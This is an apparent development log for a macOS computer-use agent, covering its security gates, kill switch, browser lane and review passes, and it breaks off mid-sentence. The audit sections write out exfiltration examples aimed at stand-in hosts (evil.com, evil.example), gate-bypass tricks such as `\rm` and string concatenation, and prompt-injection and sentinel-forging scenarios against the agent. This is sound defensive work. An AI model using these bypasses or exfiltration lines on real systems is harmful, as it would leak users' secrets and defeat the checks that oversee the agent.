  `task_type:'mac'` (kind 'computer'); `tools.test.ts` asserts the AX primitives never leak to the
  realtime registry, mirroring the Firecrawl invariant.
- **Swift SDK-surface gotchas (cost three build iterations, all in `Sources/Mac/`):** (1) not every
  `kAX*Role` is exported — `kAXLinkRole`/`kAXSegmentedControlRole` don't exist in this SDK; the AX
  server still RETURNS those role strings, so match `"AXLink"`/`"AXSegmentedControl"` by string.
  (2) `CGEventPostToPid`/`CGEventPost` are hard-deprecated into errors by the Swift overlay — use the
  instance methods `event.postToPid(pid)` / `event.post(tap:)`. My reflexive "free functions are safer
  across SDKs" was exactly backwards. On an SDK bump, re-check both.
- **Settle is poll-based, not AXObserver-driven** (deliberate, matches the research). Observers are
  lossy on Sequoia/Tahoe (destroyed/changed drop silently) and the research itself mandates poll
  reconciliation — so a debounced signature poll (value + child-count until stable ~180 ms, hard
  timeout) is the correct baseline, not a fragile background-runloop observer. If snapshots ever feel
  slow on dense apps, the perf lever is batching reads via `AXUIElementCopyMultipleAttributeValues`
  (already used in the main `walk`; individual reads elsewhere are the simple-correct choice).
- **Verify-by-diff is structural.** `ax_act` returns a before/after diff computed in the executor;
  an empty diff is surfaced verbatim ("no observable change") so the model can't assume success —
  `AXPress` false-passes on backgrounded/disabled items. The loop instructions
  (`openai-runner.ts` computerInstructions) carry the entire injection load (a custom AX toolset gets
  none of the API's built-in computer-use classifiers) + the verify-states-not-elements discipline.
- **Kill switch tags, not motion-watches.** Every synthetic event carries a `CGEventSource` userData
  tag (`0x47554D424F`); the listen-only session tap aborts on any UNTAGGED HID. This is the research
  correction — "any mouse movement aborts" self-triggers once the global rung moves the real pointer.
  The tap re-enables itself on `tapDisabledByTimeout/UserInput` so it can't go blind mid-task.
- **Test isolation gotcha:** `mac-audit.jsonl` now has THREE test writers (audit/run/mac-tools),
  like `search-audit.jsonl` already has (tavily/exa/firecrawl). Absolute-line-count assertions only
  hold under the canonical `npm test -w daemon` (each file mkdtemps its own home = sole writer).
  Forcing ONE shared `GUMBO_HOME` across files races those counts — it's a pre-existing suite property,
  not a mac regression. Run the suite the canonical way; "fresh GUMBO_HOME" means don't reuse a stale
  dir across runs, which per-file mkdtemp already guarantees.
- **Verified (how):** daemon suite 192/192 (`npm test -w daemon`); shell `xcodegen generate` +
  `xcodebuild` BUILD SUCCEEDED, no warnings; daemon boots clean with the full M6 wiring (placeholder
  keys, scratch home → "listening"); a scratch smoke exercised the REAL execFile bash lane
  (unit tests stub it): auto command ran + audited gate:auto, a bad command surfaced typed
  `script_error`, a `sudo` command was declined at the gate and never executed — three audit lines,
  one per action. **Still pending (the user):** the live GUI demos — "open Notes and draft a packing
  list" AX-only with the visible ghost cursor + untagged-input abort, and "open Chrome to claude.ai"
  as a single hot mac_do — need the app running with Accessibility granted.

### M6 review-address pass (2026-07-17, /review-2 on Fable — 1 debugger + 1 code-auditor — → /address)

2 🔴 + 8 🟡 + 8 🔵, all fixed on the branch (daemon 198/198, shell builds). The two Criticals were
genuine and both landed on the `mac_do` execution path — the review's real value was proving the
gate is the *entire* security boundary for the unsandboxed lane, so every hole in it is load-bearing:
- **🔴 secret exposure:** `runBashDaemonSide` spawned bash with no `env`, so the child inherited the
  daemon's provider keys — `mac_do("printenv OPENAI_API_KEY")` would echo a key into the realtime
  context. Fixed by stripping `secretEnvKeys` exactly like `claude-runner`'s `subprocessEnv()`. The
  bash lane had NO real-execFile test (the unit tests inject `runBash`), which is why it slipped —
  added one that sets a real key + sentinel and asserts the key is stripped but other env survives.
- **🔴 delete-gate bypass:** `riskyDelete` matched delete commands by exact basename, so `/bin/rm` and
  `\rm` (both ordinary, non-obfuscated) skipped the whole delete check and auto-ran. Fixed with a
  `commandName()` that strips a leading path/backslash for the COMMAND slot only (targets keep their
  dir). Same pass closed the sibling gate gaps the pattern table *named but didn't catch*: osascript
  `send`/`do shell script`/`with administrator privileges` (the table was bash-shaped but run verbatim
  on AppleScript — the word "osascript" is never in the osascript body), and GET-style exfil
  (`curl "…?k=$SECRET"`, `open` an expanded URL) which the upload-only network pattern missed.
- **🟡 the notable ones:** the sub-agent's `run_script` was entirely ungated (arbitrary shell reachable
  from obeyed on-screen injection) — now routed through the same policy table + a notch confirm threaded
  from the ConfirmBridge escalate path (declined → audited, never runs). The kill switch failed OPEN: if
  `CGEvent.tapCreate` returned nil (PostEvent grant missing) the task drove the machine with no abort —
  now `arm()` returns success and `MacBridge` fails closed via `mac_abort(kill_switch_unavailable)`. The
  Swift snapshot `generation` was dead code (stale refs silently rebound to a same-index element) — now
  encoded in the ref string. The `key` verb was DOA (the tool contract says ref-null but Swift's ref
  guard rejected it) — now handled before the guard, targeting the focused app.
- **Non-obvious discovery, NOT in the review:** the `key` verb being dead means the keyboard-shortcut
  rung the Notes demo leans on (`cmd+n`) never worked in the original build — the demo would have
  fallen back to clicking or stalled. Worth knowing before the live demo. Also: `URLSessionWebSocketTask.send`
  is already internally serialized, so the flagged cross-thread `onReply` race was ordering-only (no
  byte corruption); funneled through main anyway for consistency with every other sender.
- Two 🔵 resolved as documented-and-kept rather than changed (the double focused-window walk per act
  is bounded by the 2 s messaging timeout and fine for attended single-user; the confirm-string cap is
  backed by the risky-class `reason` which already carries the operative token). All others fixed.

### M6 second review pass — /review-2 (Fable agents) on the fix delta itself (2026-07-16)

the user caught that the address-pass fixes + demo polish were themselves un-reviewed; a second
/review-2 (both agents on Fable) over f59a87c..f81e793 found 1 🔴 + 8 🟡 + 6 🔵 — all addressed
(daemon 213/213, shell builds). The big lesson is recorded here because it WILL recur:
- **🔴 (corroborated, verified-by-execution twice): the address pass itself introduced the bypass.**
  Splitting the broad `\b(mail|sendmail|osascript)…send\b` pattern into two "more precise" ones
  (a) anchored command-position WITHOUT `\n` in the separator class — the exact newline lesson the
  same commit taught riskyDelete — so `echo hi\nmail -s x…` auto-ran; (b) dropped `\bmail\b`
  matching inside `tell application "Mail" to send …` — a REGRESSION of reviewed behavior.
  **Precision refactors of blocklists are regression-prone in a way additive changes aren't;
  re-review the fix delta, and pin the OLD pattern's catches as tests before rewriting one.**
- Gate consolidation: both script lanes now go through ONE choke point (`gateScript` in policy.ts —
  normalize, then decide on the same string the executor runs; lane param: shortcuts auto on the hot
  lane, confirm in the sub-agent lane). Drift between the two hand-rolled gate sites was already
  visible (audit truncation, shortcuts exemption) after one day.
- New confirm classes from the pass: secret-store reads (`cat .env` returned keys into context
  despite the env strip — the strip guards the CHILD env, not the file), xargs-fed fetchers,
  non-literal `do shell script` bodies (concatenation `"r" & "m -rf …"` split the risky token
  across every lens — confirm as unresolvable, the SHELL_EXPANSION stance).
- The literal-URL exfil residual (model composes `open location "https://evil/?d=<screen text>"`,
  no expansion) is now RECORDED in policy.ts's header as accepted-for-v1 — closing it needs an
  M7 host-allowlist decision, not a regex.
- maxBuffer error code verified empirically: Node 26 raises `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`
  (killed=undefined) — the exact-string `…STDOUT_MAXBUFFER_EXCEEDED` check was a dead branch;
  now matched by family + a real 400 KB overflow test.
- Stall detection is now a STRUCTURED `no_change` wire flag (Swift sets it when the settled diff
  is empty) — the daemon previously grepped the English phrase out of output that also carries
  attacker-controllable screen text (spoof/suppress risk + wording-drift fragility).
- Skipped (recorded): a research-not-blocked-by-mac-task test needs an injectable runSubagent seam
  or live network; the guard's `if (taskType === 'mac')` structurally exempts research tasks.

## M7 BUILT — computer use v2: browser lane, vision lane, handoff, steering (2026-07-19)

Built to the locked SPEC §M7 on worktree-m7-computer-use (daemon 329/330 — the 1 skip is
M6's recorded runSubagent-seam skip; shell builds clean; live headed-Chrome smoke passes).
Phases committed separately: browser lane (7fa4ef1), vision lane (13f76bd), handoff +
steering (0bcb21d), polish (e8b5c43). What is non-obvious and worth keeping:

- **Playwright aria-ref ground truth (probed live against playwright-core 1.61.1 — the
  probe script matters because none of this is documented):** (1) a DEFAULT-mode
  `ariaSnapshot()` WIPES the injected script's aria-ref map — the next `aria-ref=eN`
  locator resolves to nothing. Every capture in `browser/client.ts` is therefore
  `mode:'ai'`, and diffs strip `[ref=…]` + `[active]` instead (stripForDiff). (2) ai-mode
  refs are per-ELEMENT stable across captures and DOM mutation (e7 stays e7 while the
  element lives) — but that's an implementation detail, not a contract, so the M6-style
  generation encoding (`g3e12`, reject old generations) stays as the strict guard against
  silent rebind. (3) frame refs (`f2e5`) auto-jump frames via Playwright's own selector.
- **Browser auth is exactly the SPEC's capture-once-replay:** non-persistent launch
  (`playwright-core` + `channel:'chrome'`, headed) + fresh context per task seeded from
  `~/Gumbo/browser/state.json`, re-captured at task end AND immediately after an approved
  handoff (a login must survive a later crash). A persistent user-data-dir was rejected —
  Chrome's own password manager could then store credentials, violating "no stored
  passwords, ever". state.json holds live session cookies → secret-classed: read-denied
  in the Claude-session Seatbelt profile + a `Gumbo/browser` clause in the mac_do
  secret-store pattern; ~/Gumbo/browser is never /files-served.
- **The M6 literal-URL exfil residual is CLOSED, with a lane split:** gateScript now runs
  literal fetch/open URLs (per fetchy segment, on the NORMALIZED script) through
  mac/hosts.ts — unknown host → confirm. SUB-AGENT lane only: the hot lane transcribes
  the user's own spoken words and has no screen-read context to exfiltrate (same trust
  split as the shortcuts lane). One allowlist serves both surfaces (browser navigation +
  script URLs): base config + remembered store, subdomain matching, escalate-with-
  memoization per task (M4.1 egress posture), "Remember <host>" notch toggle +
  /api/hosts + dashboard section for management.
- **Browser submit gate is deterministic, not semantic:** lexicon on the accessible name
  THE MODEL SAW in its snapshot (refTable parses the same yaml — an attacker shifting the
  page between snapshot and act can't swap the gate's inputs), plus POST-form rules
  (button click / Enter in a POST form confirms even when the name dodges the lexicon;
  GET forms = search stay auto). `type` refuses newlines — pressSequentially would press
  Enter mid-string and dodge the gate; fill covers multiline (sets value, no keystrokes).
- **screen_look is a NESTED vision query, not an image-in-context tool:** capture →
  /v1/responses with ONE question + the PNG → only the text answer enters the loop.
  Screenshots structurally never accumulate in context (the SPEC's "never
  full-frame-every-turn" enforced by construction, not prompt); the PNG persists in the
  task workspace and the audit line records that pixels left the machine. OCR stays the
  first rung (on-device, free) and capture_denied is a typed MacErrorKind — the model
  tells the user exactly which grant to flip.
- **ALL vision-lane coordinate math lives in ScreenVision.swift, next to the pixels:**
  SCWindow/SCDisplay frames are global top-left points; Vision boxes are normalized
  bottom-left — converted once, shell-side; the model only ever sees global points it
  hands back to click_point verbatim. filter.pointPixelScale carries the DPR. SCK's
  async-only API is semaphore-bridged on MacBridge's serial queue (never main) with its
  own 8 s timeout under the daemon's RPC budget.
- **KillSwitch: pure-modifier flagsChanged NEVER aborts (steering's enabler).** The ⌃⌥
  PTT chord IS a flagsChanged event — under M6's any-untagged-input rule, TALKING to a
  running task killed it. A modifier alone can neither type nor click, so exempting
  flagsChanged gives up no takeover coverage. Handoff mode is a second carve-out:
  `handoffActive` suppresses the abort while the user performs his step; task-end clears
  it defensively (disarmSession), and MacBridge resync re-broadcasts an active handoff
  so a shell relaunch mid-login doesn't abort on his in-progress typing.
- **Steering rides tool results, not SDK surgery:** manager queues send_to_session text
  for RUNNING computer tasks; wrapSteering monkey-wraps every computer tool's `invoke`
  (the exact surface the SDK runner AND the unit tests call — the suite pins the patch
  point) and appends "STEERING FROM THE USER" to the next result. Delivered exactly once;
  dies with the task. send_to_session's description widened — realtime registry
  unchanged (M7 adds ZERO realtime tools; tools.test.ts pins the browser/vision/handoff
  primitives out).
- **Handoff lifecycle lives in TaskManager, not the tool:** needs_input flip (the
  existing announce path speaks it) → setHandoff(true) → notch confirm titled "Your
  turn — tap Done when finished" (5-min EscalationRequest.timeoutMs override,
  deny-on-timeout → the model wraps up cleanly) → finally setHandoff(false) + status
  restore (skipped if the task finished/cancelled meanwhile). The remember write-through
  fires ONLY for requests that carried remember_host and ONLY on approval — a lying
  shell can't allowlist arbitrary hosts through unrelated confirms.
- **Ghost cursor over web pages:** in-page CDP acts generate no HID at all, so the ghost
  is their only visible trace — browser_act computes the element's global center
  (boundingBox + the window outer/inner-delta origin formula; slightly off with devtools
  docked, fine for a cosmetic overlay) and fires cursor_to fire-and-forget.
- **Suite/env gotchas:** browser-tools tests remember `ok.test` into the per-file
  mkdtemp'd hosts store — fine under canonical per-file isolation, one more reason never
  to force a shared GUMBO_HOME. The smoke scripts (scratchpad) launch REAL headed Chrome
  via the worktree's client — re-run them on any Playwright/Chrome bump (probe.mjs is
  the aria-ref stability probe; treat a behavior change there as a breaking upgrade).

### M7 review-address pass (2026-07-19, /review-2 on Fable — 1 debugger + 1 code-auditor — → /address)

1 🔴 + 8 🟡 + 7 🔵 surfaced; all 🔴/🟡 fixed + 5 of 7 🔵 (daemon 345/1-skip, +16 tests; shell
builds; live browser smoke re-verified incl. corrupt-state recovery). The 🔴 was genuine and
on the new HTTP mutation surface — the review's real value, mirroring M6, was proving the gates
are the entire security boundary:
- **🔴 CSRF write to the exfil allowlist:** `POST /api/hosts` had no Origin check while the WS
  hub right beside it does (`verifyClient`). A POST is a CORS *simple* request (no preflight), so
  a hostile page the user has open could `fetch('http://127.0.0.1:8737/api/hosts', {method:'POST',
  mode:'no-cors', body:'{"host":"evil.example"}'})` and silently seed the allowlist — then a later
  computer task navigates/fetches evil.example with no notch confirm. Fixed by mirroring the hub's
  Origin allowlist on the mutation branch (absent Origin = native shell → allowed), a 4 KB body cap,
  and a shared `validHostEntry` (bare hostname WITH a dot — `{"host":"com"}` would otherwise
  allowlist an entire TLD via the subdomain match). New `http.test.ts` (7 cases) covers it.
- **🟡 URL-gate concatenation/indirection bypass (corroborated by both agents):** `extractFetchUrls`
  split on *shell* separators, but the gate only runs on AppleScript, where `&` is string
  concatenation — `open location "https://<allowed>" & "@evil.com/?d=<screen text>"` split so the
  allowed anchor passed and the `@evil.com` fragment was skipped; executor opened
  `https://<allowed>@evil.com/…` (userinfo@host = evil.com). Variable indirection (`set u to … &
  secret` / `open location u`) and property-list nav (`{URL:…}`, `set URL of … to`) evaded the same
  way. Fixed with `unresolvableNavTarget` (a nav verb whose target is a bare variable or a `&`
  concatenation → confirm, the SHELL_EXPANSION stance the do-shell-script guard already takes) +
  adding `url` to the fetchy-segment lexicon so property-list literals get host-checked. **Pinned
  the OLD extractFetchUrls catches as regression tests BEFORE the rewrite** (the twice-proven M6
  lesson) and added the new-catch tests; 24 policy tests green.
- **🟡 "send/submit/purchase always confirms" was really "risky NAME or POST-form":** widened —
  accessible names are NFKC+zero-width-normalized before the lexicon (kills fullwidth `Ｓｅｎｄ` and
  `S​e​n​d` padding evasion), and a `select` change inside a POST form now confirms (onchange
  submit). Honest residual DOCUMENTED in the comment: cross-script homoglyphs (Cyrillic `Ѕend`) and
  a consequential JS `onclick` on an innocuously-named control OUTSIDE a `<form>` are the ceiling of
  a name/form heuristic — the untrusted-screen-text rule + the model having no incentive to disguise
  its own actions are the mitigation.
- **🟡 forgeable STEERING sentinel:** `wrapSteering` now defangs any `STEERING FROM THE USER` occurrence
  in the (untrusted) tool output BEFORE appending the real one — a page echoing the phrase can't forge
  the user's voice (the structured-`no_change` spoof lesson applied to steering; a plain-text channel
  can't be fully authenticated but the model never sees the marker except where the daemon put it).
- **🟡 browser-client uncaught exception / corrupt state.json:** `requirePage()` threw *outside* the
  try in snapshot/act/back → whole task hard-failed; `open()` now guarantees a live page (adopt a
  surviving tab, else a blank one) so the model gets a snapshot to navigate from, and a truncated
  `state.json` self-heals (delete + fresh context) instead of wedging every future task. captureState
  is temp-then-rename (atomic) as the belt to that.
- **🟡 region-capture display divergence (Swift):** the display was resolved twice with divergent
  fallbacks, so a straddling/off-screen region captured the whole fallback display while OCR math
  assumed the region → every coordinate wrong. Resolved once, reused for filter AND sourceRect.
- **🟡 handoff finally flicker + 🔵s:** abort-guard on the handoff status-restore (no spurious
  running→cancelled flicker); `wrapSteering` forwards all SDK args; `settleAndDiff` reports an
  unsettled page instead of diffing against empty (whole-page-"removed" artifact); `switch_tab`
  audits with its landed URL; `screen_look` `capture_denied` test; `~/Gumbo/logs` added to the
  Claude-session `readDenied` (audit URLs can carry query-string tokens).
- **Deliberately deferred:** 🔵 the two lanes' repetition/stall/`present()` guards are near-identical
  copies — a shared helper is the right call, but extracting it across two working lanes right before
  the live demos, with the "precision refactor regresses" lesson fresh, is a separate change. Recorded
  so it isn't lost.

### M7 SECOND review-address pass — /review-2 on the fix delta itself (2026-07-19)

The twice-proven M6 discipline (re-review the fix delta; the FIRST address pass introduced
M6's worst bug) paid off again: a second /review-2 (both Fable agents) over the first
address commit (c3205ee..08d77dc) found that MY OWN `unresolvableNavTarget` fix was
incompletely closed — the exact "fix reads correct but reopens the gate" class. Both agents
corroborated; DB1 independently found a second variant. All addressed (daemon 350/1-skip,
live smoke + shell build green):
- **🔴 (corroborated) brittle nav-gate parse.** My first-pass `NAV_VERB` used `set\s+url\s+of`
  and inspected only the token immediately after the first literal. Two reachable evasions of
  the concat/indirection gate the pass CLAIMED to close: (a) the idiomatic definite article
  `set the URL of …` broke the regex (CA1); (b) a `¬` line-continuation split the `&` onto the
  next physical line, past the `startsWith('&')` check (DB1). `do JavaScript`/`execute
  javascript` were in no list at all. **Lesson re-confirmed: a precise parser of a blocklist is
  fragile — every reviewer found a new variant.** Fixed by ABANDONING the precise parse for an
  over-approximation that fails SAFE by construction: fold `¬` continuations at the normalize
  layer (so the gate AND extractFetchUrls see one statement — this also closed a clean
  `open location ¬\n "unlisted"` that was escaping the host check entirely), article-tolerant
  verb, JS-in-page always unresolvable, and treat ANY `&` in the nav statement as runtime-built
  → confirm (a `&` inside the target literal's query string is excluded). The only residual is
  over-confirm (a legit clean nav with a `&` in a trailing comment), which is harmless.
- **🟡 dead select gate.** The first pass added a select-in-POST-form rule to browserActDecision
  but browser-tools only fetched formMethod for click/press-enter, so the branch never ran in
  production — the unit test passed by calling the pure function directly. This is the
  "test mocks past the fix" trap: a green suite over illusory code. Fixed (select ∈ needsForm)
  + an integration test that drives a real select THROUGH the tool.
- **🔵s:** 413 body-cap bounds the append before socket teardown; ghost-cursor boundingBox
  timeout 1500→400 ms so the cosmetic fly can't stall a real act on a stale ref.
- **Self-audit of THIS pass (guarding against a third-order regression):** the nav-gate change
  is now an over-approximation (any-& = confirm), which structurally removes the "precision bug"
  class the reviews kept finding — the failure mode is over-confirm (safe), never under-confirm
  (the hole). normalizeOsascript's `-e` unwrap is unchanged for non-`¬` scripts (suite confirms).
  A third full /review-2 is available but the gate now fails safe by construction, so the natural
  stopping point is reached; the remaining merge gates are the live demos with the user.
- **Not pushed.** Feature-branch worktree, no remote; merge to main stays gated on the review
  flow + live GUI demos.

## M9–M13 gap analysis — two research passes → SPEC completeness arc (2026-07-19)

the user asked for a SOTA gap analysis to define post-M8 phases. Two Fable research agents ran in
parallel — one on FRONTIER TECHNIQUES/papers, one on the OSS/PRODUCT landscape — each given a dense
Gumbo capability inventory + the hard design constraints (local, single-user, macOS, privacy-first,
no commercial infra) so they'd return real, buildable gaps rather than generic advice or things
Gumbo already has. Both reports were folded into SPEC §M9–M13. This section preserves the parts of
their findings that don't belong in the SPEC proper — the convergence, the "don't re-add" list, and
the anti-recommendations — so no future session re-derives them.

**The convergence (the load-bearing signal).** Two independent passes ranked the SAME gaps at the
top. Both #1/#2: memory + a user model (Gumbo keeps a full event log but never learns the user). OSS
#1: personal-data connectors (mail/messages/calendar — the defining feature of every shipped personal
agent). Technique #2: a taint/provenance bit (closes the M7 literal-URL residual by principle). Both
#3-ish: proactivity (brief + watchers) and semantic recall. → SPEC M9 memory, M10 taint, M11
connectors, M12 proactive, M13 self-improvement. Dependency-ordered (memory personalizes the rest;
taint before more private data lands; connectors before the proactive layer that reads them).

**Already-SOTA — do NOT re-add (both passes agreed Gumbo matches or leads the field here):**
- Deterministic out-of-band gating (policy table + Seatbelt + egress proxy + confirms) — the exact
  defense family that survived 2026's adaptive-attack evals while in-band detectors/classifiers broke
  at >90% (arxiv 2606.26479). No personal-agent OSS project ships default-deny egress at all.
- Flat act→observe loop + coding-action lane — Agent S3 reached this by ABLATING its own
  manager-worker hierarchy (+13%) and adding a coding agent (simular.ai/articles/agent-s3).
- Orchestrator-worker + tool-description routing + small realtime registry — matches Anthropic's
  production research architecture and its "tool descriptions are load-bearing" lesson.
- OCR-first on-device vision w/ cloud one-shot; poll-never-webhook; typed errors; fail-closed kill
  switch; dedicated-profile browser lane w/ storage-state auth + cooperative handoff — at/above field
  practice. The only active OSS macOS-control competitor (browser-use's macOS-use) is abandoned.
- Trace completeness (per-call JSONL audit + sqlite event log) — HAL-grade raw material, already
  collected; realtime speech-to-speech + PTT + barge-in beats every OSS STT→LLM→TTS stack on latency.

**Anti-recommendations — popular field patterns Gumbo should deliberately NOT adopt:**
- Full CaMeL/NOVA plan interpreters — ~43% capability tax on OSWorld + still leak via Branch Steering
  (arxiv 2601.09923); capability-scoped gates + taint labels (M10) buy most protection at no tax.
- Behavior Best-of-N / wide parallel rollouts — needs resettable VMs; unsafe on a live Mac (SPEC §M8
  already rejected it; the 2026 research re-confirms it's an eval-time technique).
- Debate/judge/verifier panels + deeper agent hierarchies — fixed-budget multi-agent synergy collapses
  via correlated errors (arxiv 2601.17311), and AI "organizations" measure LESS aligned than the same
  models run singly (alignment.anthropic.com/2026/ai-organizations) — wrong direction for a
  machine-controlling agent.
- In-band injection classifiers as a PRIMARY defense — the class that broke >90% under adaptive attack;
  fine only as a cheap advisory layered on the deterministic gate.
- Always-on ambient sensing / wake-word-for-anticipation — needs the continuous capture PTT was chosen
  to avoid; PTT is the consent boundary, not a limitation. Multi-channel chat gateway / device nodes /
  skills marketplace (OpenClaw's growth surface) — outward auth+exfil surface, multi-tenant infra in
  disguise. Cloud memory platforms (hosted Letta/Mem0/Zep) + knowledge-graph RAG at n-of-1 — the
  TECHNIQUES port to local sqlite; the products/heavy-indexes don't fit. Full-duplex model swap today —
  Moshi-class models trail frontier on reasoning/tool-use and the production realtime API is itself
  still half-duplex. 24/7 screen recording (~20 GB/mo, max privacy blast radius). Any telemetry.

**Key comparables/citations** (full set inline in SPEC §M9–M13): Letta/MemGPT (arxiv 2310.08560) +
sleep-time compute (2504.13171) + mem0 extract-consolidate (2504.19413); lethal-trifecta
(simonwillison.net/2025/Jun/16) + CaMeL (2503.18813) + the adaptive-attack eval (2606.26479);
Agent-S3, workflow-use/Terminator (record→replay→heal validates M8); Voyager (2305.16291) + ACE
(2510.04618); sqlite-vec + contextual-retrieval; PRISM calibrated proactivity (2602.01532); the
macos-mcp TCC access recipes + iMCP (validates shell-owns-TCC). OSWorld: frontier general models now
pass the 72.36% human baseline (Fable 5 / Mythos 5 ~85%), so Gumbo's model choice is not the
bottleneck — accumulation is.

**NOT a build.** M9–M13 are design-only, specced-not-built, in the same status as M8. No code written.

### M7 live-demo pass 2 — browser-lane demos with the user (2026-07-20)

- **Confirm/kill-switch Catch-22 (live):** the host-approval confirm asks for the user's input while
  the armed tap treats ALL his input as an abort — moving toward Approve killed the task. M6 never
  hit this (hot-path confirms run with no task armed); M7's browser lane is the first coexistence.
  Fix: `makeStandDown` (manager) — ONE counter-based bracket wrapping EVERY computer-task escalate
  (host approvals, risky scripts, submit gates, handoff alike). Counter, not boolean: the SDK can
  issue parallel tool calls, and the first confirm resolving must not re-arm under the second.
- **Kill-switch label race (live):** the abort resolves a pending confirm as a deny, which reaches
  the surviving model loop as a normal tool refusal — it wrote a farewell report and
  `finishWithReport('done')` beat the rejection path. A task the user killed read as "successful".
  Fix: `cancelComputerTasks` now `finish(id,'cancelled')`s at abort time; `finish` is idempotent
  (first writer wins) so the runner's later settlement no-ops. Kill switch = hard stop, in the
  store and audibly, the instant he touches the machine.
- **Login-wall handoff refusal (live, twice):** the agent saw GitHub's signed-out page / sign-in
  redirect and ended the task with "the user must sign in" — the system-prompt handoff rule never
  fired (its trigger pattern-matched a *login form*, and none was on screen; then even broadened
  prose failed). Lesson recorded: prompt rules fail at their TRIGGERS, and prose alone is too weak
  for must-fire behaviors — moved the trigger into the tool result (`loginNudge`: goto/back/
  switch_tab/snapshot append "call request_handoff NOW" when the LANDED url is a sign-in page;
  segment-exact matching so `/blog/why-sso-matters` can't false-positive). Third use of the
  next-attention-point pattern (steering, stall notes, now this).
- **Persistent automation profile (the user's call — he wants uBlock):** running on his LIVE Chrome
  was asked for and re-declined (anti-bot burn, permanently open debug port, profile singleton,
  whole-logged-in-life blast radius — recorded in SPEC §M7). Instead the dedicated profile is now
  persistent: `launchPersistentContext(~/Gumbo/browser/profile)` with `ignoreDefaultArgs:
  ['--disable-extensions']` — verified against the INSTALLED playwright-core 1.61.1 source that
  it passes `--disable-extensions` by default, and branded Chrome no longer honors
  `--load-extension` side-loading, so Web-Store-install-into-profile is the only supported route.
  state.json capture-once-replay machinery deleted (Chrome owns the disk state — a mid-handoff
  login is durable as typed; `onHandoffDone` plumbing removed end-to-end). "No stored passwords,
  ever" survives via a one-time Preferences seed (`credentials_enable_service:false`) written
  only before Chrome's first run. No Singleton-lock auto-clearing: Chrome self-heals stale locks,
  and force-clearing a live one would share the profile between two Chromes. Script-gate +
  Seatbelt already denied `~/Gumbo/browser` wholesale — the profile inherited both, comments only.
  Live smoke (real headed Chrome): flags stripped + right profile, prefs seed survives Chrome
  exit, teardown-relaunch clean.
- Still landing in the companion shell commit: kill-switch RE-ARM GRACE — run 1 died to trailing
  mouse drift right after the user clicked Approve (a hand doesn't freeze at the click frame).
- **Demo close-out (same night):** the full login-handoff workflow VERIFIED end-to-end (goto →
  click Sign in → handoff Done → notifications read), then the logged-in replay VERIFIED — the
  persistent profile answered "who am I logged in as" with zero prompts, uBlock active. Late
  finds, all fixed same-session: the model kept ENDING at login walls even past the tool-result
  nudge (a third path shape — the signed-out homepage has no login-ish URL), so the runner now
  BOUNCES a login-shaped inability ending once when request_handoff was never called
  (needsHandoffBounce, history-concat continuation — deterministic exit guard beats any trigger
  heuristic); handoff buttons say Done/Cancel (label overrides ride the confirm protocol as
  optional fields); quitting the automation browser mid-handoff auto-declines the pending prompt
  (BrowserClient.onContextClosed → local abort → the existing confirm_cancel dismiss); the voice
  tier pre-opened a task's page in the user's REGULAR Chrome (the M6 "ONE command" routing example
  became a decoy-window bug once the browser lane existed — mac_do's description now forbids
  pre-opening pages a computer task will drive); blank automation browser = the DEFINED normal
  start (never a finding, never a reason to stop). Also live-learned: the user's filtering DNS
  blackholes clients2.google.com, which breaks Web-Store installs with a lying "check internet
  connection" (allowlist it — extension AUTO-UPDATES are silently broken under that block); the
  profile singleton fails loudly if the manually-opened automation window is left open (by
  design — close it, the task launches its own). M7 demo checklist COMPLETE — the remaining
  gate to merge is the user's call.

## M9–M17 external-research fold — two deep-research reports → SPEC amendments + 4 new phases (2026-07-20)

the user ran `RESEARCH_BRIEF.md` through Claude Research and ChatGPT deep research and pasted both
reports; this pass folded them into SPEC §M9–M17. Method: amend-in-place where a report extended an
existing phase, new milestones only where content didn't fold cleanly (the user pre-authorized),
anti-recommendations never reversed, corroborations recorded here rather than restated in SPEC.

- **Independent double-hits (both reports, different sources — the strongest signal in the fold):**
  (1) two-axis confidentiality×integrity labels beyond the planned taint bit (FIDES lineage, NOT
  CaMeL — both explicitly drew that line) → M10; (2) an on-device small-model tier (Apple
  Foundation Models + MLX) + privacy/effect-aware routing → new M15; (3) App Intents / Shortcuts as
  a typed first-party action lane → new M16; (4) source-attributed + bitemporally-valid memory with
  principled forgetting → M9; (5) calibrated abstention MUST be out-of-band (RiskEval: models
  "almost never abstain" even when optimal; AgentAbstain ~59% paired accuracy + post-hoc
  abstention) → M13; (6) explicit ephemeral physical perception, never ambient → new M17; (7)
  prompt-cache discipline as a stated design constraint → M15; (8) near-identical premature lists
  (payments rails, A2A/remote delegation, thin clients, per-user fine-tuning, learned gates as
  primary, speculative mutating execution) → Deferred/out-of-scope, verbatim spirit.
- **The two #1 picks COMPOSE:** ChatGPT's transactional-autonomy substrate (effect classes, durable
  journal, COMMIT_UNKNOWN reconcile-never-retry, single-use permits, receipts, compensation-from-
  receipts, fault-injection discipline; SagaLLM/ACRFence-informed) + Claude's APFS-localsnapshot
  universal undo (tmutil ~0.01s CoW checkpoints, mount-ro selective restore; full-volume rollback
  entitlement-gated — scope stated honestly) = new **M14 Transactional effects & universal undo**,
  the extension's keystone. Claude's durable-execution/record-replay item folded into the same
  phase (journal = authoritative; replay consumes recorded outputs, blocks live shell actions).
- **One genuine conflict, recorded not resolved:** a local-only MCP boundary (`gumbo-mcp` stdio
  shim). ChatGPT: build it (capability leases, effect-proposal-only). Claude: rejected-adjacent
  ("multi-channel gateway in disguise"). → DEFERRED in SPEC with both positions + the constraints
  any future build must honor. Do not build speculatively.
- **Mere corroborations (no SPEC change needed):** deterministic out-of-band gating as the
  surviving defense family (both reports re-validated the M10 stance and the 2026 adaptive-attack
  read); sleep-time consolidation + PRISM-style etiquette (already M9/M12); the intentions ledger
  extended M12 rather than contradicting it (PM-Bench's monitoring-false-positive lesson shaped the
  channel-indexed, no-heartbeat design).
- **Citation honesty:** several load-bearing sources are 2026 preprints (PM-Bench, AgentAbstain,
  ACRFence, MemGate, transaction closure) — SPEC header carries the caveat. TSM and MemGate came
  with NO arxiv ids in either report, so SPEC cites them by name only (an early draft of this fold
  invented ids for both — caught and stripped before commit; never cite an id a source didn't
  give). Apple WWDC26 items (AFM3, image input, App Schemas) are vendor claims pre-GA — flagged in
  M15/M16. Report-given ids/urls used as-is: FIDES 2505.23643, RiskEval 2601.07767, vllm-mlx
  2601.19139, RouteLLM 2506.22716, R2R 2505.21600, Zep 2501.13956, x402 2605.30998, Progent
  2504.11703, plus Apple developer/tmutil/mount_apfs docs.
- **Sequencing note added to the arc header:** M14 can interleave after M10 (receipts want labels;
